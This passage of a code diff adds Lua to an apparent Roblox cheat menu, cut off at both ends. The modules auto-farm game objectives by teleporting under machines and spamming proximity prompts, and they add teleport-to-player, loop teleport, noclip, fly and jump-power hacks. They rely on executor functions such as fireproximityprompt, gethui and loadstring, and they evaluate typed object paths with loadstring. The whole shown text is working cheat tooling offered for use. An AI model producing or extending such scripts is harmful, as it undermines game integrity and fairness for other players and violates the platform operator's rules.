+
+                -- Check if finished
+                if #getAllCoilPrompts() == 0 then
+                    teleportTo(safeZone)
+                    coilAutomationEnabled = false
+                    wave = 0
+                end
+            end
+        end
+
+        task.wait(1)
+    end
+end)
+
+-- Toggle UI
+MainTab:Toggle({
+    Title = "Auto Tesla coils",
+    Desc = "",
+    Value = false,
+    Callback = function(state)
+        coilAutomationEnabled = state
+    end
+})
+
+
+-- ===== Smart & Fast Auto Koda (Fixed) =====
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local player = Players.LocalPlayer
+
+local autoKodaEnabled = false
+local autoKodaThread = nil
+
+-- Paths (SAFE)
+local interactsFolder = Workspace:WaitForChild("Interacts")
+local enemiesFolder = Workspace:WaitForChild("Enemies")
+
+-- Try to get DeliveryPoint safely
+local function getDeliveryPoint()
+    local persistent = Workspace:FindFirstChild("Persistent")
+    if persistent then
+        return persistent:FindFirstChild("DeliveryPoint")
+    end
+end
+
+-- Utils
+local function getHRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function teleportHRP(hrp, cf)
+    if hrp and cf then
+        hrp.CFrame = cf
+        task.wait(0.05)
+    end
+end
+
+-- 🔍 Detect Koda (FAST + ACCURATE)
+local function isKodaPresent()
+    for _, obj in ipairs(enemiesFolder:GetChildren()) do
+        local name = string.lower(obj.Name)
+        if name == "rejectkoda" then
+            return true
+        end
+    end
+    return false
+end
+
+-- ⏳ Wait until Koda spawns
+local function waitForKoda()
+    while autoKodaEnabled and not isKodaPresent() do
+        print("Waiting")
+        task.wait(2)
+    end
+
+    if autoKodaEnabled then
+       print("working...")
+    end
+end
+
+-- Machine utils
+local function getMachineCF(machine)
+    if machine.PrimaryPart then return machine.PrimaryPart.CFrame end
+    local ok, cf = pcall(function() return machine:GetBoundingBox() end)
+    if ok then return cf end
+    for _, d in ipairs(machine:GetDescendants()) do
+        if d:IsA("BasePart") then return d.CFrame end
+    end
+end
+
+local function getMachinePrompt(machine)
+    local interaction = machine:FindFirstChild("Interaction")
+    if interaction then
+        local prompt = interaction:FindFirstChildOfClass("ProximityPrompt", true)
+        if prompt then return prompt end
+    end
+    for _, d in ipairs(machine:GetDescendants()) do
+        if d:IsA("ProximityPrompt") then return d end
+    end
+end
+
+local function firePrompt(prompt)
+    if prompt then
+        prompt:InputHoldBegin()
+        task.wait(0.08)
+        prompt:InputHoldEnd()
+    end
+end
+
+local function machineDone(machine)
+    local vfx = machine:FindFirstChild("VFX")
+    return not vfx or #vfx:GetChildren() == 0
+end
+
+local function handleMachine(hrp, machine)
+    local prompt = getMachinePrompt(machine)
+    if not prompt then return end
+
+    local cf = getMachineCF(machine)
+    if not cf then return end
+
+    local sizeY = (machine.PrimaryPart and machine.PrimaryPart.Size.Y) or 4
+    local underCF = cf * CFrame.new(0, -sizeY/2 - 0.5, 0)
+
+    -- Teleport once
+    teleportHRP(hrp, underCF)
+
+    -- Freeze the HRP under the machine
+    local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+    bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bodyVelocity.Parent = hrp
+
+    -- Keep firing prompt while machine is not done
+    while autoKodaEnabled and not machineDone(machine) do
+        firePrompt(prompt)
+        task.wait(0.1)
+    end
+
+    -- Remove freeze after done
+    bodyVelocity:Destroy()
+end
+
+-- Main worker
+local function autoKodaWorker()
+    local hrp = getHRP()
+
+    -- WAIT FOR KODA FIRST
+    waitForKoda()
+
+    while autoKodaEnabled do
+        local activeMachines = {}
+
+        for _, m in ipairs(interactsFolder:GetChildren()) do
+            if m.Name ~= "ItemCollection" and not machineDone(m) then
+                table.insert(activeMachines, m)
+            end
+        end
+
+        if #activeMachines == 0 then
+            local dp = getDeliveryPoint()
+            if dp then
+                teleportHRP(hrp, dp.CFrame + Vector3.new(0, 3, 0))
+            end
+            task.wait(0.5)
+        else
+            for _, machine in ipairs(activeMachines) do
+                handleMachine(hrp, machine)
+            end
+        end
+
+        task.wait(0.15)
+    end
+end
+
+-- Toggle
+function startAutoKoda()
+    if autoKodaEnabled then return end
+    autoKodaEnabled = true
+    if not autoKodaThread then
+        autoKodaThread = task.spawn(autoKodaWorker)
+    end
+end
+
+function stopAutoKoda()
+    autoKodaEnabled = false
+    autoKodaThread = nil
+end
+
+-- UI toggle
+MainTab:Toggle({
+    Title = "Auto Koda",
+    Desc = "Working just like auto farm but teleport under machine to avoid koda",
+    Flag = "autokoda_toggle",
+    Value = false,
+    Callback = function(state)
+        if state then startAutoKoda() else stopAutoKoda() end
+    end
+})
+-- ===== end Improved Auto Koda =====
+MainTab:Slider({
+    Title = "Auto Hide Duration",
+    Flag = "auto_hide_duration",
+    Step = 1,
+    Value = { Min = 1, Max = 30, Default = hideDuration },
+    Callback = function(value) hideDuration = value end
+})
+MainTab:Toggle({
+    Title = "Auto Hide",
+    Flag = "auto_hide_toggle",
+    Value = false,
+    Callback = function(state) if state then startAutoHide() else stopAutoHide() end end
+})
+
+-- Auto Teleport to machine (safe, noclip) start/stop
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+-- state
+autoTeleMach = autoTeleMach or false
+local noclipConnection = noclipConnection
+local autoTeleMachThread = autoTeleMachThread
+
+-- helper: safe teleport above a target CFrame with fallback to safe zone
+local function safePlaceAbove(hrp, targetCFrame, heightOffset)
+	heightOffset = heightOffset or 3
+	if not hrp or not targetCFrame then return false end
+
+	local newCFrame = targetCFrame + Vector3.new(0, heightOffset, 0)
+	pcall(function() hrp.CFrame = newCFrame end)
+	task.wait(0.05)
+
+	local posY = hrp.Position.Y
+	if posY and posY > 1 then return true end
+
+	local safeZone = workspace:FindFirstChild("Persistent")
+		and workspace.Persistent:FindFirstChild("Zones")
+		and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+
+	if safeZone and safeZone:IsA("BasePart") then
+		pcall(function() hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0) end)
+		return true
+	end
+
+	pcall(function() hrp.CFrame = CFrame.new(0, 10, 0) end)
+	return false
+
+end
+
+local function isBoundingBoxValid(machine)
+	local ok, cf, size = pcall(function() return machine:GetBoundingBox() end)
+	if not ok or not cf or not size then return false end
+	if cf.Position.Y < 1 then return false end
+	if size.Y <= 0 or size.Y > 100 then return false end
+	return true, cf, size
+end
+
+local function isRejectNearby()
+	if type(isRejectNearby) == "function" then
+		local ok, res = pcall(isRejectNearby)
+		return ok and res
+	end
+	return false
+end
+
+local function safeFirePrompt(prompt, timeout)
+	timeout = timeout or 3
+	local start = tick()
+	while tick() - start <= timeout do
+		if not prompt or not prompt.Parent then return false end
+		local ok = pcall(function() fireproximityprompt(prompt) end)
+		if ok then task.wait(0.06) else task.wait(0.05) end
+		if not prompt.Parent then return true end
+	end
+	return false
+end
+
+-- handle a single machine model (works for both normal and Golden_Machine)
+local function handleMachine(hrp, machine, originalCFrame)
+	if not autoTeleMach then return end
+
+	local vfx = machine:FindFirstChild("VFX")
+	if not vfx or #vfx:GetChildren() == 0 then return end
+
+	local valid, cf, size = isBoundingBoxValid(machine)
+	if not valid then return end
+
+	local targetCFrame = cf - Vector3.new(0, size.Y / 2, 0)
+	targetCFrame = targetCFrame + Vector3.new(0, 3, 0)
+
+	if isRejectNearby() then task.wait(0.6) return end
+
+	local placed = safePlaceAbove(hrp, targetCFrame, 3)
+	if not placed then return end
+
+	local prompt = machine:FindFirstChildWhichIsA("ProximityPrompt", true)
+
+	if prompt then
+		local promptTimeout = 6
+		local start = tick()
+		while autoTeleMach and prompt.Parent and machine:FindFirstChild("VFX") and #machine.VFX:GetChildren() > 0 do
+			pcall(function() hrp.CFrame = targetCFrame end)
+			local fired = safeFirePrompt(prompt, 0.6)
+			if not fired and (tick() - start) > promptTimeout then break end
+			task.wait(0.08)
+		end
+	else
+		local start = tick()
+		local timeout = 6
+		while autoTeleMach and machine:FindFirstChild("VFX") and #machine.VFX:GetChildren() > 0 and (tick() - start) <= timeout do
+			pcall(function() hrp.CFrame = targetCFrame end)
+			task.wait(0.08)
+		end
+	end
+
+end
+
+local function startAutoTeleMach()
+	if autoTeleMach then return end
+	autoTeleMach = true
+
+	if not noclipConnection then
+		noclipConnection = RunService.Stepped:Connect(function()
+			local char = player.Character
+			if char then
+				for _, part in pairs(char:GetDescendants()) do
+					if part:IsA("BasePart") then
+						part.CanCollide = false
+					end
+				end
+			end
+		end)
+	end
+
+	if autoTeleMachThread then return end
+	autoTeleMachThread = task.spawn(function()
+		while autoTeleMach do
+			task.wait(0.2)
+			local char = player.Character or player.CharacterAdded:Wait()
+			local hrp = char and char:FindFirstChild("HumanoidRootPart")
+			if not hrp then continue end
+
+			-- [Smart Mode] save original position before doing anything
+			local originalCFrame = hrp.CFrame
+
+			local interacts = workspace:FindFirstChild("Interacts")
+			if not interacts then continue end
+
+			-- ── Normal machines ──────────────────────────────────────────
+			for _, machine in ipairs(interacts:GetChildren()) do
+				if not autoTeleMach then break end
+				if machine.Name == "ItemCollection" then continue end
+				handleMachine(hrp, machine, originalCFrame)
+				task.wait(0.05)
+			end
+
+			-- ── ToughMachine → Golden_Machine (Smart Mode) ───────────────
+			if autoTeleMach then
+				local toughParent = interacts:GetChildren()[3]
+				if toughParent then
+					local toughMachine = toughParent:FindFirstChild("ToughMachine")
+					if toughMachine then
+						local goldenMachine = toughMachine:FindFirstChild("Golden_Machine")
+						if goldenMachine then
+							handleMachine(hrp, goldenMachine, originalCFrame)
+						end
+					end
+				end
+			end
+
+			-- [Smart Mode] return to original position after all machines done
+			if autoTeleMach then
+				pcall(function() hrp.CFrame = originalCFrame end)
+			end
+
+			task.wait(0.3)
+		end
+
+		autoTeleMachThread = nil
+	end)
+
+end
+
+local function stopAutoTeleMach()
+	autoTeleMach = false
+
+	if noclipConnection then
+		pcall(function() noclipConnection:Disconnect() end)
+		noclipConnection = nil
+	end
+
+	autoTeleMachThread = nil
+
+	local char = player.Character
+	if char then
+		for _, part in pairs(char:GetDescendants()) do
+			if part:IsA("BasePart") then
+				pcall(function() part.CanCollide = true end)
+			end
+		end
+	end
+end
+
+-- Toggle in TeleportSection
+TeleportSection:Toggle({
+	Title = "Auto teleport to machine",
+	Flag = "autotelemach_noclip_toggle",
+	Value = false,
+	Callback = function(state)
+		if state then
+			startAutoTeleMach()
+		else
+			stopAutoTeleMach()
+		end
+	end
+})
+MainTab:Toggle({
+    Title = "FullBright",
+    Flag = "fullbright_toggle",
+    Value = false,
+    Callback = function(state) if state then enableFullBright() else disableFullBright() end end
+})
+
+
+
+
+dbg("Auto Farm module loaded and UI wired.")
+
+
+
+-- Inputs
+local targetPlayerName = ""
+local targetObjectPath = ""
+
+TeleportSection:Input({
+    Title = "Player Name",
+    Placeholder = "Enter player name",
+    Callback = function(value)
+        targetPlayerName = value
+    end
+})
+
+local selectedObject = nil
+
+-- INPUT (object path)
+TeleportSection:Input({
+    Title = "Object Path",
+    Placeholder = "Workspace.Part",
+    Callback = function(value)
+        local success, result = pcall(function()
+            return loadstring("return " .. value)()
+        end)
+
+        if success and result then
+            selectedObject = result
+            print("Selected:", result.Name)
+        else
+            selectedObject = nil
+            warn("Invalid path")
+        end
+    end
+})
+
+-- INPUT (object name finder)
+TeleportSection:Input({
+    Title = "Object Name",
+    Placeholder = "Enter name to find",
+    Callback = function(value)
+        selectedObject = nil
+
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v.Name == value then
+                selectedObject = v
+                print("Found:", v:GetFullName())
+                break
+            end
+        end
+
+        if not selectedObject then
+            warn("Object not found")
+        end
+    end
+})
+
+-- TELEPORT BUTTON
+TeleportSection:Button({
+    Title = "Teleport to Object",
+    Callback = function()
+        if selectedObject and HRP then
+            local part = selectedObject:IsA("BasePart") and selectedObject
+                or selectedObject:FindFirstChildWhichIsA("BasePart", true)
+
+            if part then
+                HRP.CFrame = part.CFrame + Vector3.new(0,3,0)
+            else
+                warn("No BasePart found")
+            end
+        else
+            warn("No valid object selected")
+        end
+    end
+})
+
+-- Single Teleport to Player
+TeleportSection:Button({
+    Title = "Teleport to Player",
+    Icon = "solar:arrow-right-bold",
+    Callback = function()
+        local plr = game:GetService("Players"):FindFirstChild(targetPlayerName)
+        local char = game.Players.LocalPlayer.Character
+        if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+            WindUI:Notify({
+                Title = "Teleport",
+                Content = "Teleported to " .. targetPlayerName,
+                Icon = "solar:location-bold",
+                Duration = 4,
+            })
+        end
+    end
+})
+
+-- Single Teleport to Object
+
+-- Loop Teleport Toggle
+local loopTeleportEnabled = false
+TeleportSection:Toggle({
+    Title = "Loop Teleport",
+    Flag = "loop_teleport_toggle",
+    Value = false,
+    Callback = function(state)
+        loopTeleportEnabled = state
+        if state then
+            task.spawn(function()
+                while loopTeleportEnabled do
+                    local char = game.Players.LocalPlayer.Character
+                    if targetPlayerName ~= "" then
+                        local plr = game:GetService("Players"):FindFirstChild(targetPlayerName)
+                        if plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
+                            char.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        end
+                    elseif targetObjectPath ~= "" then
+                        local success, result = pcall(function()
+                            return loadstring("return " .. targetObjectPath)()
+                        end)
+                        if success and result and char and char:FindFirstChild("HumanoidRootPart") then
+                            char.HumanoidRootPart.CFrame = result.CFrame + Vector3.new(0, 3, 0)
+                        end
+                    end
+                    task.wait(1) -- teleport every second
+                end
+            end)
+        end
+    end
+})
+--// Teleport Function (to machines that still have VFX children)
+local function teleportAboveMachine()
+    local machines = workspace.Interacts:GetChildren()
+    local player = game.Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+
+    local targetMachine
+
+    -- find the first machine that has VFX children (meaning incomplete)
+    for _, machine in ipairs(machines) do
+        if machine.Name ~= "ItemCollection" then
+            local vfx = machine:FindFirstChild("VFX")
+            if vfx and #vfx:GetChildren() > 0 then
+                targetMachine = machine
+                break
+            end
+        end
+    end
+
+    if targetMachine then
+        local targetCFrame
+        if targetMachine:IsA("Model") then
+            local cf, size = targetMachine:GetBoundingBox()
+            targetCFrame = cf + Vector3.new(0, size.Y/2 + 10, 0)
+        elseif targetMachine:IsA("BasePart") then
+            targetCFrame = targetMachine.CFrame + Vector3.new(0, targetMachine.Size.Y/2 + 10, 0)
+        end
+
+        if targetCFrame then
+            hrp.CFrame = targetCFrame
+            WindUI:Notify({
+                Title = "Teleport",
+                Content = "Teleported above incomplete Machine.",
+                Icon = "solar:cursor-square-bold",
+                Duration = 3,
+            })
+        else
+            WindUI:Notify({
+                Title = "Error",
+                Content = "Machine has no valid position.",
+                Icon = "solar:info-square-bold",
+                Duration = 3,
+            })
+        end
+    else
+        WindUI:Notify({
+            Title = "Teleport Blocked",
+            Content = "All Machines are completed (no VFX children).",
+            Icon = "solar:info-square-bold",
+            Duration = 3,
+        })
+    end
+end
+
+--// Button
+TeleportSection:Button({
+    Title = "Teleport to Machine",
+    Flag = "Telemach_button",
+    Icon = "solar:cursor-square-bold",
+    Callback = function()
+        teleportAboveMachine()
+    end
+})
+
+
+
+
+
+--// Safe Noclip Toggle (replace existing block)
+local noclipEnabled = false
+local noclipConnection = nil
+
+-- safe getter for HRP (uses existing helper if present)
+local function _getHRP()
+    if safeGetHRP then
+        return safeGetHRP()
+    end
+    local plr = game:GetService("Players").LocalPlayer
+    local char = plr and plr.Character
+    if not char then char = plr and plr.CharacterAdded and plr.CharacterAdded:Wait() end
+    return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function setNoclipEnabled(state)
+    if state == noclipEnabled then return end
+    noclipEnabled = state
+
+    -- If enabling, start a Stepped loop that sets CanCollide = false safely
+    if noclipEnabled then
+        -- try to acquire cooperative lock for movement if available
+        if acquireLock then
+            -- best-effort: don't block if lock unavailable
+            pcall(function() acquireLock("noclip", 1) end)
+        end
+
+        if noclipConnection then
+            pcall(function() noclipConnection:Disconnect() end)
+            noclipConnection = nil
+        end
+
+        noclipConnection = game:GetService("RunService").Stepped:Connect(function()
+            local plr = game:GetService("Players").LocalPlayer
+            local char = plr and plr.Character
+            if not char then return end
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    pcall(function() part.CanCollide = false end)
+                end
+            end
+        end)
+
+        dbg("Noclip enabled")
+    else
+        -- disabling: stop loop, restore collisions, release lock, and run recovery
+        if noclipConnection then
+            pcall(function() noclipConnection:Disconnect() end)
+            noclipConnection = nil
+        end
+
+        -- restore collisions on character parts
+        local plr = game:GetService("Players").LocalPlayer
+        local char = plr and plr.Character
+        if char then
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    pcall(function() part.CanCollide = true end)
+                end
+            end
+        end
+
+        -- release cooperative lock if we acquired it earlier
+        if releaseLock then
+            pcall(function() releaseLock("noclip") end)
+        end
+
+        -- run recovery to fix stuck states (uses helper if available)
+        if fixStuckAfterNoclip then
+            pcall(function() fixStuckAfterNoclip() end)
+        else
+            -- fallback small recovery
+            local hrp = _getHRP()
+            if hrp then
+                pcall(function() hrp.AssemblyLinearVelocity = Vector3.new(0,0,0) end)
+                pcall(function() hrp.CFrame = hrp.CFrame + Vector3.new(0, 3, 0) end)
+                local hum = hrp.Parent and hrp.Parent:FindFirstChildOfClass("Humanoid")
+                if hum then pcall(function() hum.PlatformStand = false; hum:ChangeState(Enum.HumanoidStateType.GettingUp) end) end
+            end
+        end
+
+        dbg("Noclip disabled and collisions restored")
+    end
+end
+
+-- UI toggle (uses setter)
+PlayerTab:Toggle({
+    Title = "Noclip",
+    Flag = "noclip_toggle",
+    Value = false,
+    Callback = function(state)
+        setNoclipEnabled(state)
+    end
+})
+-- Robust Fly Module for PC Mobile Gamepad
+-- Drop this into your script where PlayerTab is available
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+
+-- Config
+local flySpeed = 50
+local decelTime = 0.18 -- smooth stop time
+
+-- Internal state
+local flyEnabled = false
+local flyBV = nil
+local flyLoop = nil
+
+-- Utility: safe pcall wrapper
+local function safe(fn, ...)
+    local ok, res = pcall(fn, ...)
+    if not ok then return nil end
+    return res
+end
+
+-- Create BodyVelocity attached to HRP
+local function createBV(hrp)
+    if not hrp then return nil end
+    local bv = Instance.new("BodyVelocity")
+    bv.Name = "TZHub_FlyBV"
+    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bv.P = 1250
+    bv.Velocity = Vector3.new(0,0,0)
+    bv.Parent = hrp
+    return bv
+end
+
+-- Compute desired velocity using Humanoid.MoveDirection and camera pitch
+local function computeVelocity(humanoid, hrp, speed)
+    local moveDir = humanoid and humanoid.MoveDirection or Vector3.new(0,0,0)
+    if moveDir.Magnitude <= 0.01 then
+        return Vector3.new(0,0,0)
+    end
+
+    local cam = workspace.CurrentCamera
+    if not cam then
+        local horiz = Vector3.new(moveDir.X, 0, moveDir.Z)
+        if horiz.Magnitude <= 0.01 then return Vector3.new(0,0,0) end
+        return horiz.Unit * speed
+    end
+
+    -- horizontal from MoveDirection, vertical from camera look Y scaled by forward alignment
+    local horizontal = Vector3.new(moveDir.X, 0, moveDir.Z)
+    local horizVel = Vector3.new(0,0,0)
+    if horizontal.Magnitude > 0.01 then
+        horizVel = horizontal.Unit * speed
+    end
+
+    local camLook = cam.CFrame.LookVector
+    local camForwardXZ = Vector3.new(camLook.X, 0, camLook.Z)
+    local forwardAmount = 0
+    if camForwardXZ.Magnitude > 0.01 and horizontal.Magnitude > 0.01 then
+        forwardAmount = math.clamp(horizontal.Unit:Dot(camForwardXZ.Unit), -1, 1)
+    end
+
+    local vertical = camLook.Y * forwardAmount * speed
+    return Vector3.new(horizVel.X, vertical, horizVel.Z)
+end
+
+-- Smoothly decelerate and cleanup
+local function smoothStop(hrp)
+    if not hrp then return end
+    -- lerp AssemblyLinearVelocity to zero
+    local startVel = hrp.AssemblyLinearVelocity
+    local t0 = tick()
+    while tick() - t0 < decelTime do
+        local alpha = (tick() - t0) / decelTime
+        local newVel = startVel:Lerp(Vector3.new(0,0,0), alpha)
+        safe(function() hrp.AssemblyLinearVelocity = newVel end)
+        task.wait()
+    end
+    safe(function() hrp.AssemblyLinearVelocity = Vector3.new(0,0,0) end)
+end
+
+-- Start fly loop
+local function startFly()
+    if flyEnabled then return end
+    flyEnabled = true
+
+    flyLoop = task.spawn(function()
+        while flyEnabled do
+            task.wait() -- responsive loop
+
+            local char = player and player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not hrp or not hum then
+                task.wait(0.2)
+                continue
+            end
+
+            if not flyBV or not flyBV.Parent then
+                if flyBV then safe(function() flyBV:Destroy() end) end
+                flyBV = createBV(hrp)
+            end
+
+            local desired = computeVelocity(hum, hrp, flySpeed)
+            if desired.Magnitude > 0.01 then
+                flyBV.Velocity = desired
+            else
+                flyBV.Velocity = Vector3.new(0,0,0)
+            end
+        end
+    end)
+end
+
+-- Stop fly loop safely
+local function stopFly()
+    if not flyEnabled and not flyBV then return end
+    flyEnabled = false
+
+    -- capture HRP to operate on
+    local char = player and player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+    -- if BV exists, smoothly lerp its velocity to zero then destroy
+    if flyBV and flyBV.Parent then
+        local startVel = flyBV.Velocity
+        local t0 = tick()
+        while tick() - t0 < decelTime do
+            local alpha = (tick() - t0) / decelTime
+            local newVel = startVel:Lerp(Vector3.new(0,0,0), alpha)
+            if flyBV and flyBV.Parent then
+                flyBV.Velocity = newVel
+            elseif hrp then
+                hrp.AssemblyLinearVelocity = newVel
+            end
+            task.wait()
+        end
+        safe(function() if flyBV and flyBV.Parent then flyBV:Destroy() end end)
+        flyBV = nil
+    else
+        -- no BV: still ensure assembly velocity is smoothed
+        if hrp then smoothStop(hrp) end
+    end
+
+    -- final safety clears
+    if hrp then
+        safe(function() hrp.AssemblyLinearVelocity = Vector3.new(0,0,0) end)
+    end
+end
+
+-- UI wiring helper
+local function ensurePlayerTabAndWire(PlayerTab)
+    if not PlayerTab then
+        warn("Fly UI not created: PlayerTab is nil")
+        return false
+    end
+
+    -- Toggle
+    PlayerTab:Toggle({
+        Title = "Fly",
+        Value = false,
+        Callback = function(state)
+            if state then
+                startFly()
+            else
+                stopFly()
+            end
+        end
     })
 
-MenuGroup:AddButton("Unload", function()
-    Library:Unload()
+    -- Slider
+    PlayerTab:Slider({
+        Title = "Fly Speed",
+        Flag = "fly_slider",
+        Step = 1,
+        Value = {
+            Min = 10,
+            Max = 300,
+            Default = flySpeed,
+        },
+        Callback = function(value)
+            flySpeed = value
+        end
+    })
+
+    return true
+end
+
+-- Attempt to wire UI now. If PlayerTab is not global, caller must pass it in.
+-- If your script has a variable PlayerTab, call ensurePlayerTabAndWire(PlayerTab) after PlayerTab is created.
+if _G and _G.PlayerTab then
+    ensurePlayerTabAndWire(_G.PlayerTab)
+else
+    -- try to find PlayerTab global name used earlier in your script
+    if PlayerTab then
+        ensurePlayerTabAndWire(PlayerTab)
+    else
+        -- print instruction so you can wire it manually
+        print("Fly module loaded. Call ensurePlayerTabAndWire(PlayerTab) after PlayerTab is created.")
+    end
+end
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local JumpPower = 50
+local JumpEnabled = false
+local root = (gethui and gethui()) or game:GetService("CoreGui")
+
+pcall(function()
+	if root:FindFirstChild("TZ_JumpGui") then root:FindFirstChild("TZ_JumpGui"):Destroy() end
 end)
 
-Library.ToggleKeybind = Options.MenuKeybind
+local JumpGui = Instance.new("ScreenGui")
+JumpGui.Name = "TZ_JumpGui"
+JumpGui.ResetOnSpawn = false
+JumpGui.IgnoreGuiInset = true
+JumpGui.DisplayOrder = 1000
+JumpGui.Parent = root
 
-ThemeManager:SetLibrary(Library)
-SaveManager:SetLibrary(Library)
+local JumpButton = Instance.new("TextButton")
+JumpButton.Size = UDim2.new(0, 120, 0, 50)
+JumpButton.Position = UDim2.new(0.82, 0, 0.7, 0)
+JumpButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+JumpButton.BorderSizePixel = 0
+JumpButton.Text = ""
+JumpButton.AutoButtonColor = false
+JumpButton.Visible = false
+JumpButton.Active = true
+JumpButton.Parent = JumpGui
 
-SaveManager:IgnoreThemeSettings()
-SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
+Instance.new("UICorner", JumpButton).CornerRadius = UDim.new(0, 12)
 
-ThemeManager:SetFolder("BookESP")
-SaveManager:SetFolder("BookESP/configs")
+local stroke = Instance.new("UIStroke", JumpButton)
+stroke.Color = Color3.fromRGB(60, 60, 60)
+stroke.Thickness = 1.2
 
-SaveManager:BuildConfigSection(Tabs["UI Settings"])
-ThemeManager:ApplyToTab(Tabs["UI Settings"])
+local btnLabel = Instance.new("TextLabel")
+btnLabel.Size = UDim2.new(1, 0, 1, 0)
+btnLabel.BackgroundTransparency = 1
+btnLabel.Text = "JUMP"
+btnLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+btnLabel.TextSize = 16
+btnLabel.Font = Enum.Font.GothamBold
+btnLabel.Parent = JumpButton
 
-SaveManager:LoadAutoloadConfig()
+-- Press animation
+JumpButton.MouseButton1Down:Connect(function()
+	TweenService:Create(JumpButton, TweenInfo.new(0.1), {
+		BackgroundColor3 = Color3.fromRGB(99, 102, 241),
+		Size = UDim2.new(0, 112, 0, 44)
+	}):Play()
+	TweenService:Create(stroke, TweenInfo.new(0.1), {
+		Color = Color3.fromRGB(99, 102, 241)
+	}):Play()
+end)
+
+JumpButton.MouseButton1Up:Connect(function()
+	TweenService:Create(JumpButton, TweenInfo.new(0.15), {
+		BackgroundColor3 = Color3.fromRGB(15, 15, 15),
+		Size = UDim2.new(0, 120, 0, 50)
+	}):Play()
+	TweenService:Create(stroke, TweenInfo.new(0.15), {
+		Color = Color3.fromRGB(60, 60, 60)
+	}):Play()
+end)
+
+-- Appear / disappear animation
+local function showButton(state)
+	if state then
+		JumpButton.Visible = true
+		JumpButton.Size = UDim2.new(0, 0, 0, 0)
+		JumpButton.BackgroundTransparency = 1
+		btnLabel.TextTransparency = 1
+		TweenService:Create(JumpButton, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+			Size = UDim2.new(0, 120, 0, 50),
+			BackgroundTransparency = 0
+		}):Play()
+		TweenService:Create(btnLabel, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+	else
+		TweenService:Create(JumpButton, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+			Size = UDim2.new(0, 0, 0, 0),
+			BackgroundTransparency = 1
+		}):Play()
+		TweenService:Create(btnLabel, TweenInfo.new(0.15), {TextTransparency = 1}):Play()
+		task.delay(0.25, function()
+			if not JumpEnabled then JumpButton.Visible = false end
+		end)
+	end
+end
+
+-- Jump logic
+local function Jump()
+	local char = LocalPlayer.Character
+	if not char then return end
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		hum.JumpPower = JumpPower
+		hum:ChangeState(Enum.HumanoidStateType.Jumping)
+	end
+end
+
+JumpButton.MouseButton1Click:Connect(Jump)
+
+-- Smart Mode: re-show button if player respawns while enabled
+local smartConn
+local function startSmart()
+	if smartConn then smartConn:Disconnect() end
+	smartConn = LocalPlayer.CharacterAdded:Connect(function()
+		if JumpEnabled then
+			task.wait(0.5)
+			showButton(true)
+		end
+	end)
+end
+
+startSmart()
+
+-- Dragging (touch + mouse)
+local dragging, dragStart, startPos = false, nil, nil
+
+JumpButton.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = JumpButton.Position
+	end
+end)
+
+JumpButton.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = false
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		JumpButton.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- WindUI toggle
+PlayerTab:Toggle({
+	Title = "Enable Jump Button",
+	Flag = "jump_button",
+	Desc = "Show or hide jump button",
+	Value = false,
+	Callback = function(state)
+		JumpEnabled = state
+		showButton(state)
+	end
+})
+
+
+PlayerTab:Slider({
+    Title = "Jump Height",
+    Desc = "Change jump power",
+    Flag = "jumph_slider",
+    Step = 5,
+    Value = {
+        Min = 20,
+        Max = 300,
+        Default = 50,
+    },
+    Callback = function(value)
+        JumpPower = value
+    end
+})
+
+-- Expanded animation slots: Idle, Walk, Run, Jump, Fall, Swim, Climb, Emote
+assert(PlayerTab, "PlayerTab not found. Run this after creating PlayerTab.")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Config
+local WALK_SPEED_THRESHOLD = 0.5
